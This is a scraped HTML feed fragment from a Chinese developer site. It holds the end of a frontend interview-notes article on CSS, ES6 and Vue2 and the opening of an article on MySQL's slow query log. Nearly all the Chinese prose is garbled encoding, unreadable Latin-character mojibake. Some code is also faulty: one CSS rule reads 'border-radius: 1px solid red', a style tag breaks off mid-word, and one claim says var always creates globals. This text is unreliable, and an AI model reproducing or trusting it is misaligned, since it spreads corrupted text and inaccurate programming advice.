</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
</code></pre>
<p><strong>å¤šè¡Œ</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.demo</span> {
    <span class="hljs-attribute">position</span>: relative;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;
    <span class="hljs-attribute">overflow</span>: hidden;
}
<span class="hljs-selector-class">.demo</span><span class="hljs-selector-pseudo">::after</span> {
    <span class="hljs-attribute">content</span>: <span class="hljs-string">"..."</span>;
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-number">0</span> <span class="hljs-number">10px</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"demo"</span>&gt;</span>æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬æ–‡æœ¬<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
</code></pre>
<p>csså®ç°</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-tag">p</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">400px</span>;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">1px</span> solid red;
    -webkit-line-clamp: <span class="hljs-number">2</span>;
    <span class="hljs-attribute">display</span>: -webkit-box;
    -webkit-box-orient: vertical;
    <span class="hljs-attribute">overflow</span>: hidden;
    <span class="hljs-attribute">text-overflow</span>: ellipsis;
}
&lt;/styl
</span></code></pre>
<h4 data-id="heading-66">7.CSS3æ–°å¢äº†å“ªäº›æ–°ç‰¹æ€§ï¼Ÿ</h4>
<p>é€‰æ‹©å™¨ï¼š</p>
<ul>
<li><code>nth-child(n)</code></li>
<li><code>nth-last-child(n)</code></li>
<li><code>last-child</code></li>
</ul>
<p>æ–°æ ·å¼ï¼š</p>
<ul>
<li><code>border-radius</code>; åˆ›å»ºåœ†è§’è¾¹æ¡†</li>
<li><code>box-shadow</code>; ä¸ºå…ƒç´ æ·»åŠ é˜´å½±</li>
<li><code>border-image</code>; å›¾ç‰‡ç»˜åˆ¶è¾¹æ¡†</li>
<li><code>background-clip</code>; ç¡®å®šèƒŒæ™¯ç”»åŒº</li>
<li><code>background-size</code>; è°ƒæ•´èƒŒæ™¯å›¾å¤§å°</li>
</ul>
<p>æ–‡å­—ï¼š</p>
<ul>
<li><code>word-wrap: normal|break-word</code>; ä½¿ç”¨æµè§ˆå™¨é»˜è®¤çš„æ¢è¡Œ | å…è®¸åœ¨å•è¯å†…æ¢è¡Œ;</li>
<li><code>text-overflow; clip | ellipsis</code>; ä¿®å‰ªæ–‡æœ¬ | æ˜¾ç¤ºçœç•¥ç¬¦å·æ¥ä»£è¡¨è¢«ä¿®å‰ªçš„æ–‡æœ¬;</li>
<li><code>text-decoration; text-fill-color| text-stroke-color | text-stroke-width</code>;</li>
</ul>
<p>transition è¿‡æ¸¡ã€transform è½¬æ¢ã€animatinåŠ¨ç”»ã€æ¸å˜ã€ç­‰</p>
<h4 data-id="heading-67">8.CSSæé«˜æ€§èƒ½çš„æ–¹æ³•æœ‰å“ªäº›ï¼Ÿ</h4>
<p>å¦‚ä¸‹ï¼š</p>
<ul>
<li>å†…è”é¦–å±å…³é”®<code>css</code></li>
<li>å¼‚æ­¥åŠ è½½<code>css</code></li>
<li>èµ„æºå‹ç¼©ï¼ˆ<code>webpack/gulp/grunt</code>ï¼‰å‹ç¼©ä»£ç </li>
<li>åˆç†çš„ä½¿ç”¨é€‰æ‹©å™¨</li>
<li>ä¸è¦ä½¿ç”¨<code>@import</code></li>
<li><code>icon</code>å›¾ç‰‡åˆæˆç­‰</li>
</ul>
<h3 data-id="heading-68">ES6</h3>
<h4 data-id="heading-69">1.var,let, constçš„åŒºåˆ«ï¼Ÿ</h4>
<ul>
<li><code>var</code> å£°æ˜çš„å˜é‡ä¼šæå‡ä¸ºå…¨å±€å˜é‡ï¼Œå¤šæ¬¡ç”Ÿæˆï¼Œä¼šè¦†ç›–ã€‚</li>
<li><code>let</code> letå£°æ˜çš„å˜é‡åªåœ¨ä»£ç å—å†…æœ‰æ•ˆã€‚</li>
<li><code>const</code> å£°æ˜ä¸€ä¸ªåªè¯»å¸¸é‡ï¼Œå¸¸é‡çš„å€¼ä¸èƒ½æ”¹å˜ã€‚</li>
</ul>
<p>åŒºåˆ«ï¼š</p>
<ul>
<li>å˜é‡æå‡ï¼Œ<code>var</code>ä¼šæå‡å˜é‡åˆ°å…¨å±€ã€‚<code>let, const</code>ç›´æ¥æŠ¥é”™</li>
<li>æš‚æ—¶æ€§æ­»åŒº</li>
<li>å—çº§ä½œç”¨åŸŸ</li>
<li>é‡å¤å£°æ˜</li>
<li>ä¿®æ”¹å£°æ˜çš„å˜é‡</li>
</ul>
<h4 data-id="heading-70">2.ES6ä¸­æ•°ç»„æ–°å¢äº†å“ªäº›æ‰©å±•ï¼Ÿ</h4>
<ul>
<li>æ‰©å±•è¿ç®—ç¬¦<code>...</code></li>
<li>æ„é€ å‡½æ•°æ–°å¢çš„æ–¹æ³• <code>Array.from(),Array.of()</code></li>
<li>æ•°ç»„å®ä¾‹æ–°å¢æ–¹æ³•æœ‰ï¼šcopyWithin(),find(),findIndex(),fill(),includes(),keys(),values()ç­‰</li>
</ul>
<h4 data-id="heading-71">3.å¯¹è±¡æ–°å¢äº†å“ªäº›æ‰©å±•</h4>
<p>å¯¹è±¡åè·Ÿå¯¹åº”å€¼åç›¸ç­‰çš„æ—¶å€™ï¼Œå¯ä»¥ç®€å†™ã€‚
const a = {foo: foo} == const a = {foo}</p>
<p><strong>å±æ€§çš„éå†ï¼š</strong></p>
<ul>
<li>for...in:å¾ªç¯éå†å¯¹è±¡è‡ªèº«çš„å’Œç»§æ‰¿çš„å¯æšä¸¾å±æ€§(ä¸å«Symbolå±æ€§)</li>
<li>Object.keys(obj):è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…æ‹¬å¯¹è±¡è‡ªèº«çš„(ä¸å«ç»§æ‰¿çš„)æ‰€æœ‰å¯æšä¸¾å±æ€§(ä¸å«Symbolå±æ€§)çš„é”®å</li>
<li>Object.getOwnPropertyNames(obj):å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«å¯¹è±¡è‡ªèº«çš„æ‰€æœ‰å±æ€§(ä¸å«Symbolå±æ€§ï¼Œä½†æ˜¯åŒ…æ‹¬ä¸å¯æšä¸¾å±æ€§)çš„é”®å</li>
<li>Object.getOwnPropertySymbols(obj):è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«å¯¹è±¡è‡ªèº«çš„æ‰€æœ‰Symbolå±æ€§çš„é”®å----- Reflect.ownKeys(obj):è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«å¯¹è±¡è‡ªèº«çš„(ä¸å«ç»§æ‰¿çš„)æ‰€æœ‰é”®åï¼Œä¸ç®¡é”®åæ˜¯Symbolæˆ–å­—ç¬¦ä¸²ï¼Œä¹Ÿä¸ç®¡æ˜¯å¦å¯æšä¸¾.</li>
</ul>
<p><strong>å¯¹è±¡æ–°å¢çš„æ–¹æ³•</strong></p>
<ul>
<li>Object.is()ï¼›</li>
<li>Object.assign()ï¼›</li>
<li>Object.getOwnPropertyDescriptors() ï¼›</li>
<li>Object.keys(), Object.values(),Object.entries()ï¼›</li>
<li>Object.fromEntries()ï¼›</li>
</ul>
<h4 data-id="heading-72">4.ç†è§£ES6ä¸­Promiseçš„ï¼Ÿ</h4>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>é“¾å¼æ“ä½œå‡ä½äº†ç¼–ç éš¾åº¦</li>
<li>ä»£ç å¯è¯»æ€§å¢å¼º</li>
</ul>
<p><code>promise</code>å¯¹è±¡ä»…æœ‰ä¸‰ç§çŠ¶æ€ï¼Œ<code>pending</code>(è¿›è¡Œä¸­)ï¼Œ<code>fulfilled</code>(å·²æˆåŠŸ)ï¼Œ<code>rejected</code>(å·²å¤±è´¥)ã€‚ä¸€æ—¦çŠ¶æ€æ”¹å˜(ä» <code>pending</code>å˜ä¸º <code>fulfilled</code>å’Œä» <code>pending</code>å˜ä¸º <code>rejected</code>)ï¼Œå°±ä¸ä¼šå†å˜ï¼Œä»»ä½•æ—¶å€™éƒ½å¯ä»¥å¾—åˆ°è¿™ä¸ªç»“æœã€‚</p>
<p><strong>ä½¿ç”¨æ–¹æ³•</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, reject</span>) {});
</code></pre>
<p><code>Promise</code>æ„é€ å‡½æ•°æ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¯¥å‡½æ•°çš„ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯<code>resolve</code>å’Œ <code>reject</code></p>
<ul>
<li><code>resolve</code>å‡½æ•°çš„ä½œç”¨æ˜¯ï¼Œå°†<code>Promise</code>å¯¹è±¡çš„çŠ¶æ€ä»"æœªå®Œæˆ"å˜ä¸º"æˆåŠŸ"</li>
<li><code>reject</code>å‡½æ•°çš„ä½œç”¨æ˜¯ï¼Œå°†<code>Promise</code>å¯¹è±¡çš„çŠ¶æ€ä»"æœªå®Œæˆ"å˜ä¸º"å¤±è´¥"</li>
</ul>
<p>å®ä¾‹æ–¹æ³•ï¼š</p>
<ul>
<li><code>then()</code> æ˜¯å®ä¾‹çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶çš„å›è°ƒå‡½æ•°ã€‚</li>
<li><code>catch()</code> æŒ‡å®šå‘ç”Ÿé”™è¯¯æ—¶çš„å›è°ƒå‡½æ•°ã€‚</li>
<li><code>finally()</code> ä¸ç®¡Prosimeå¯¹è±¡æœ€åçŠ¶æ€å¦‚ä½•ï¼Œéƒ½ä¼šæ‰§è¡Œã€‚</li>
</ul>
<p><strong>æ„é€ å‡½æ•°æ–¹æ³•</strong>
Promiseæ„é€ å‡½æ•°å­˜åœ¨ä»¥ä¸‹æ–¹æ³•ï¼š</p>
<ul>
<li>all() å°†å¤šä¸ª<code>Promise</code>å®ä¾‹åŒ…è£…æˆä¸€ä¸ªæ–°çš„<code>Promise</code>å®ä¾‹ã€‚</li>
<li>race() å°†å¤šä¸ª<code>Promise</code>å®ä¾‹åŒ…è£…æˆä¸€ä¸ªæ–°çš„<code>Promise</code>å®ä¾‹ã€‚</li>
<li>allSettled() æ¥å—ä¸€ç»„Promiseå®ä¾‹ä½œä¸ºå‚æ•°ï¼Œåªæœ‰ç­‰æ‰€æœ‰è¿™äº›å‚æ•°è¿”å›ç»“æœï¼Œå®ä¾‹æ‰ä¼šç»“æŸã€‚</li>
<li>resolve() å°†ç°æœ‰å¯¹è±¡è½¬ä¸ºPromiseå¯¹è±¡ã€‚</li>
<li>reject() è¿”å›ä¸€ä¸ªæ–°çš„Promiseå®ä¾‹ï¼ŒçŠ¶æ€ä¸ºrejectedã€‚</li>
</ul>
<h3 data-id="heading-73">Vue2é¢è¯•é¢˜</h3>
<h4 data-id="heading-74">1.ç”Ÿå‘½å‘¨æœŸï¼Ÿ</h4>
<blockquote>
<p><code>beforeCreate</code> -&gt; <code>created</code> -&gt; <code>beforeMount</code> -&gt; <code>mounted</code> -&gt; <code>beforeUpdate</code> -&gt; <code>updated</code> -&gt; <code>beforeDestroy</code> -&gt; <code>destroyed</code>ã€‚</p>
</blockquote>
<h5 data-id="heading-75">1.4 æ•°æ®è¯·æ±‚åœ¨createdå’Œmoutedçš„åŒºåˆ«</h5>
<p><code>created</code> æ˜¯åœ¨ç»„ä»¶å®ä¾‹ä¸€æ—¦åˆ›å»ºå®Œæˆçš„æ—¶å€™ç«‹åˆ»è°ƒç”¨ï¼Œè¿™æ—¶å€™é¡µé¢ <code>dom</code> èŠ‚ç‚¹å¹¶æœªç”Ÿæˆ; <code>mounted</code>æ˜¯åœ¨é¡µé¢<code>dom</code>èŠ‚ç‚¹æ¸²æŸ“å®Œæ¯•ä¹‹åå°±ç«‹åˆ»æ‰§è¡Œçš„ã€‚è§¦å‘æ—¶æœºä¸Š<code>created</code>æ˜¯æ¯”<code>mounted</code>è¦æ›´æ—©çš„ï¼Œ</p>
<p>ä¸¤è€…çš„ç›¸åŒç‚¹:éƒ½èƒ½æ‹¿åˆ°å®ä¾‹å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚è®¨è®ºè¿™ä¸ªé—®é¢˜æœ¬è´¨å°±æ˜¯è§¦å‘çš„æ—¶æœºï¼Œæ”¾åœ¨<code>mounted</code>ä¸­çš„è¯·æ±‚æœ‰å¯èƒ½å¯¼è‡´é¡µé¢é—ªåŠ¨(å› ä¸ºæ­¤æ—¶é¡µé¢domç»“æ„å·²ç»ç”Ÿæˆ)ï¼Œä½†å¦‚æœåœ¨é¡µé¢åŠ è½½å‰å®Œæˆè¯·æ±‚ï¼Œåˆ™ä¸ä¼šå‡ºç°æ­¤æƒ…å†µã€‚å»ºè®®å¯¹é¡µé¢å†…å®¹çš„æ”¹åŠ¨æ”¾åœ¨ created ç”Ÿå‘½å‘¨æœŸå½“ä¸­ã€‚</p>
<h4 data-id="heading-76">2.åŒå‘æ•°æ®ç»‘å®šæ˜¯ä»€ä¹ˆï¼Ÿ</h4>
<p>é‡Šä¹‰ï¼šå½“jsä»£ç æ›´æ–°Modelæ—¶ï¼Œviewä¹Ÿä¼šè‡ªåŠ¨æ›´æ–°ï¼Œç”¨æˆ·æ›´æ–°viewï¼ŒModelçš„æ•°æ®ä¹Ÿä¼šè‡ªåŠ¨è¢«æ›´æ–°ï¼Œå°±æ˜¯åŒå‘ç»‘å®šã€‚</p>
<h4 data-id="heading-77">3.Vueç»„ä»¶ä¹‹é—´çš„é€šä¿¡æ–¹å¼æœ‰å“ªäº›ï¼Ÿ</h4>
<ul>
<li>1.é€šè¿‡propsä¼ é€’ ï¼ˆçˆ¶ç»™å­ç»„ä»¶ä¼ é€’ï¼‰</li>
<li>2.é€šè¿‡$emitè§¦å‘è‡ªå®šä¹‰äº‹ä»¶ ï¼ˆå­ä¼ çˆ¶ï¼‰</li>
<li>3.ä½¿ç”¨ref ï¼ˆçˆ¶ç»„ä»¶ä½¿ç”¨å­ç»„ä»¶çš„æ—¶å€™ï¼‰</li>
<li>
<ol start="4">
<li>EventBus ï¼ˆå…„å¼Ÿç»„ä»¶ä¼ å€¼ï¼‰</li>
</ol>
</li>
<li>
<ol start="5">
<li>attrs ä¸ listeners ï¼ˆç¥–å…ˆä¼ é€’ç»™å­å­™ï¼‰</li>
</ol>
</li>
<li>
<ol start="6">
<li>Provide ä¸ Inject ï¼ˆåœ¨ç¥–å…ˆç»„ä»¶å®šä¹‰provideï¼‰è¿”å›ä¼ é€’çš„å€¼ï¼Œåœ¨åä»£ç»„ä»¶é€šè¿‡inject æ¥æ”¶ç»„ä»¶ä¼ é€’è¿‡æ¥çš„å€¼ã€‚</li>
</ol>
</li>
<li>
<ol start="7">
<li>Vuex ï¼ˆå¤æ‚å…³ç³»ç»„ä»¶æ•°æ®ä¼ é€’ï¼Œå­˜æ”¾å…±äº«å˜é‡ï¼‰</li>
</ol>
</li>
</ul>
<h4 data-id="heading-78">4.v-ifå’Œv-forçš„ä¼˜å…ˆçº§æ˜¯ä»€ä¹ˆï¼Ÿ</h4>
<p><code>v-forçš„ä¼˜å…ˆçº§æ¯”v-ifçš„é«˜</code></p>
<p><strong>æ³¨æ„</strong></p>
<p>ä¸èƒ½æŠŠv-if å’Œ v-for åŒæ—¶åœ¨åŒä¸€ä¸ªå…ƒç´ ä¸Šï¼Œå¸¦æ¥æ€§èƒ½æ–¹é¢çš„æµªè´¹ã€‚å¿…é¡»ä½¿ç”¨çš„è¯å¯ä»¥åœ¨å¤–å±‚å¥—ä¸€ä¸ªtemplate</p>
<h4 data-id="heading-79">5. æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</h4></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘ä»¬æ¥è¯´ä¸€ä¸‹ MySQL çš„æ…¢æŸ¥è¯¢æ—¥å¿—]]></title>    <link>https://juejin.cn/post/7590071125398356008</link>    <guid>https://juejin.cn/post/7590071125398356008</guid>    <pubDate>2026-01-02T08:53:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398356008" data-draft-id="7590159073988296756" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘ä»¬æ¥è¯´ä¸€ä¸‹ MySQL çš„æ…¢æŸ¥è¯¢æ—¥å¿—"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2026-01-02T08:53:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜å°å‡"/> <meta itemprop="url" content="https://juejin.cn/user/2285197690931932"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘ä»¬æ¥è¯´ä¸€ä¸‹ MySQL çš„æ…¢æŸ¥è¯¢æ—¥å¿—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2285197690931932/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜å°å‡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:53:53.000Z" title="Fri Jan 02 2026 08:53:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€ä»€ä¹ˆæ˜¯æ…¢æŸ¥è¯¢æ—¥å¿—</h3>
<p><strong>æ…¢æŸ¥è¯¢æ—¥å¿—ï¼ˆSlow Query Logï¼‰</strong> æ˜¯ MySQL å†…ç½®çš„ä¸€ç§æ—¥å¿—åŠŸèƒ½ï¼Œç”¨äºè®°å½•æ‰§è¡Œæ—¶é—´è¶…è¿‡æŒ‡å®šé˜ˆå€¼çš„ SQL è¯­å¥ã€‚è¿™æ˜¯ä¼˜åŒ–æ•°æ®åº“æ€§èƒ½çš„é‡è¦å·¥å…·ã€‚</p>
<h3 data-id="heading-1">äºŒã€æ ¸å¿ƒä½œç”¨</h3>
<ol>
<li><strong>æ€§èƒ½è¯Šæ–­</strong>ï¼šæ‰¾å‡ºæ‰§è¡Œæ•ˆç‡ä½çš„ SQL è¯­å¥</li>
<li><strong>ç“¶é¢ˆå®šä½</strong>ï¼šåˆ†ææŸ¥è¯¢ä¸ºä»€ä¹ˆæ…¢ï¼ˆå…¨è¡¨æ‰«æã€ç´¢å¼•ç¼ºå¤±ç­‰ï¼‰</li>
<li><strong>ä¼˜åŒ–ä¾æ®</strong>ï¼šä¸º SQL ä¼˜åŒ–å’Œç´¢å¼•è°ƒæ•´æä¾›æ•°æ®æ”¯æŒ</li>
</ol>
<h3 data-id="heading-2">ä¸‰ã€é…ç½®å‚æ•°è¯¦è§£</h3>
<pre><code class="hljs language-ini" lang="ini">-- æŸ¥çœ‹æ‰€æœ‰æ…¢æŸ¥è¯¢ç›¸å…³å‚æ•°
SHOW VARIABLES LIKE '%slow%'<span class="hljs-comment">;</span>
SHOW VARIABLES LIKE '%long_query_time%'<span class="hljs-comment">;</span>

-- ä¸»è¦é…ç½®å‚æ•°ï¼š
-- <span class="hljs-attr">slow_query_log</span> = <span class="hljs-literal">OFF</span>/<span class="hljs-literal">ON</span>          <span class="hljs-comment"># æ˜¯å¦å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—</span>
-- <span class="hljs-attr">slow_query_log_file</span> = /path/name <span class="hljs-comment"># æ—¥å¿—æ–‡ä»¶è·¯å¾„</span>
-- <span class="hljs-attr">long_query_time</span> = <span class="hljs-number">10</span>             <span class="hljs-comment"># é˜ˆå€¼ï¼ˆç§’ï¼‰ï¼Œé»˜è®¤10ç§’</span>
-- <span class="hljs-attr">min_examined_row_limit</span> = <span class="hljs-number">0</span>       <span class="hljs-comment"># æœ€å°‘æ£€æŸ¥è¡Œæ•°é˜ˆå€¼</span>
-- <span class="hljs-attr">log_queries_not_using_indexes</span> = <span class="hljs-literal">OFF</span> <span class="hljs-comment"># æ˜¯å¦è®°å½•æœªä½¿ç”¨ç´¢å¼•çš„æŸ¥è¯¢</span>
-- <span class="hljs-attr">log_slow_admin_statements</span> = <span class="hljs-literal">OFF</span>  <span class="hljs-comment"># æ˜¯å¦è®°å½•ç®¡ç†è¯­å¥</span>
-- <span class="hljs-attr">log_output</span> = FILE/TABLE/NONE     <span class="hljs-comment"># è¾“å‡ºæ–¹å¼</span>
</code></pre>
<h3 data-id="heading-3">å››ã€å¼€å¯å’Œé…ç½®</h3>
<h4 data-id="heading-4">1. ä¸´æ—¶å¼€å¯ï¼ˆé‡å¯å¤±æ•ˆï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini">SET GLOBAL <span class="hljs-attr">slow_query_log</span> = <span class="hljs-string">'ON'</span><span class="hljs-comment">;</span>
SET GLOBAL <span class="hljs-attr">long_query_time</span> = <span class="hljs-number">2</span><span class="hljs-comment">;      -- è®¾ä¸º2ç§’</span>
